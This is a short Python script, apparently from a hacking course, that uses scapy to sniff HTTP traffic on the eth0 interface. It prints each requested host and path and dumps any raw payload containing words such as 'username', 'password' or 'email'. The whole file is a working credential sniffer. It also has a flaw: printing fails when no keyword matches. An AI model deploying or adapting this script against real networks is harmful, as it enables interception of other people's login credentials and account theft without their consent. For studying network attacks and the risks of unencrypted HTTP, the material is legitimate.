#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)  # store the contents of the load field in the Raw layer in a variable
        keywords = ["username", "user", "login", "password", "pass",
                    "email"]  # use a list of commonly used words to be more suitable for more sites
        for keyword in keywords:
            if keyword in load:
                return load
                # break  # only want to print the packet once

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show) #use this to initially find what layer the info necessary can be found in
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())
        print("\n\n[+] Possible username/password > " + get_login_info(packet) + "\n\n")


sniff("eth0")